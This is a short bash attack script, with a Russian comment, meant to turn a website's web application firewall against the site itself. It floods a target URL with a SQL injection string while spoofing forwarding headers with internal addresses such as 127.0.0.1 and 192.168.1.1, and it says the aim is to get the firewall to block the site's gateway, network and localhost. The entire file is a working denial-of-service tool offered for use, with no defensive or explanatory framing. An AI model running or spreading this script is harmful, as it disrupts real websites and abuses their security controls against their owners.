#!/bin/bash
TARGET=$1
echo "[REFLECT] Turning WAF against itself..."

# Отправляем запросы с поддельными IP жертв
for ip in "10.0.0.1" "192.168.1.1" "127.0.0.1" "172.16.0.1"; do
    for i in {1..50}; do
        curl -sk --max-time 2 \
            -H "X-Forwarded-For: $ip" \
            -H "X-Real-IP: $ip" \
            -H "X-Client-IP: $ip" \
            "$TARGET?id=1' OR '1'='1" -o /dev/null 2>/dev/null &
    done
done
wait

echo "[REFLECT] WAF may now block:"
echo "  10.0.0.1 — internal network"
echo "  192.168.1.1 — default gateway"  
echo "  127.0.0.1 — localhost (site may block itself!)"
